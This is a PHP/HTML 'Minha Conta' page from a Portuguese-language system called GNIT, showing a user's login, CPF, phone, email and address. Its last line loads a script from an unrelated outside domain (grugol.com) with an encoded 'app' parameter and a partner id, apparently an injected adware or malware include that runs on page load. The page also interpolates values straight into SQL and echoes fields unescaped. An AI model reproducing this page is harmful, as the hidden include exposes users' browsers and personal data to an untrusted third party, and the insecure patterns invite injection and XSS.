<?php

include 'configs/conexao.php';

if (!isset($_SESSION)) {
  session_start();
}

$conta = $_SESSION['id'];
$sql_code = "SELECT * FROM usuário WHERE cd_usu = $conta";
$sql_query = $conn->query($sql_code);
$receber_dados = mysqli_fetch_array($sql_query);

?>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title>Minha Conta</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content="GNIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Excluir Item</h4>
        </div>
        <div class="modal-body">
          Deseja realmente excluir este Usuário?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>

  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
      </div>
      <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav">
          <li><a href="quem.php">Quem Somos</a></li>
          <li><a href="contato.php">Contato</a></li>
        </ul>
        <ul class="nav navbar-nav navbar-right">


          <!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
          <div id="perfil">
            <span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
            <a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
          </div>
        </ul>
      </div>
      <!--/.nav-collapse -->
    </div>
  </nav>
  <!--Final da NavBar-->


  <div class="container-fluid" style="margin-top:80px;">
    <div class="row">
      <div class="col-md-2" id="menu-esquerdo">
        <p><img src="img/nit.jpg" style="margin-left:15px"></p>
        <ul class="nav nav-pills nav-stacked">
          <li role="presentation"><a href="propriedades.php" .php"><img src="img/dashboard.png"> DashBoard</a></li>
          <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
          <li role="presentation" class="active"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
          <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
          <li role="presentation"><a href="index.php"><img src="img/sair.png"> Sair</a></li>
        </ul>
      </div>
      <!--Final Menu Esquerdo-->


      <div class="table-responsive col-md-10">
        <table class="table table-striped" cellspacing="0" cellpadding="0">

          <div id="main" class="container-fluid">

            <h3 class="page-header">Minha Conta</h3>

            <div class="row">
              <div class="col-md-4">
                <p><strong>Login</strong></p>
                <p><?php echo $receber_dados['lg_usu']; ?></p>
              </div>
              <div class="col-md-4">
                <p><strong>Senha</strong></p>
                <p>********</p>
              </div>

              <div class="col-md-4">
                <p><strong>Nome</strong></p>
                <p><?php echo $receber_dados['nome_usu'] ?></p>
              </div>


              <div class="col-md-4">
                <p><strong>CPF</strong></p>
                <p><?php echo $receber_dados['cpf_usu'] ?></p>
              </div>

              <div class="col-md-4">
                <p><strong>Vínculo Empregatício</strong></p>
                <p><?php echo $receber_dados['vnc_usu'] == '1' ?  'Bolsista' : 'Coordenador' ?></p>
              </div>

              <div class="col-md-4">
                <p><strong>Telefone</strong></p>
                <p><?php echo $receber_dados['tel_usu'] ?></p>
              </div>

              <div class="col-md-4">
                <p><strong>E-mail</strong></p>
                <p><?php echo $receber_dados['eml_usu'] ?></p>
              </div>


              <br>
              <div class="col-md-4">
                <p><strong>Horário</strong></p>
                <p><?php
                    if ($receber_dados['hor_usu'] == 1) {
                      echo '08h às 12h';
                    } else if ($receber_dados['hor_usu'] == 2) {
                      echo '13h às 17h';
                    } else {
                      echo '08h às 17h';
                    }
                    ?>
                </p>
              </div>
              <div class="col-md-4">
                <p><strong>Endereço</strong></p>
                <p><?php echo $receber_dados['end_usu'] ?></p>
              </div>
            </div>
          </div>


          <br />

          <div class="col-md-12">
            <a href="propriedades.php" class="btn btn-primary">Fechar</a>
            <a href="editarperfil.php?id_usu=<?php echo $conta; ?>" class="btn btn-default">Editar</a>
            <a href="#" class="btn btn-default" data-toggle="modal" data-target="#delete-modal">Excluir</a>
          </div>
      </div>


      <div class="col-md-12">
        <hr>
        <footer>
          <h3>&copy GNIT- Todos os Direitos Reservados</h3>
        </footer>

      </div>

      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

      <!-- Latest compiled and minified JavaScript -->
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
      <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>

</html>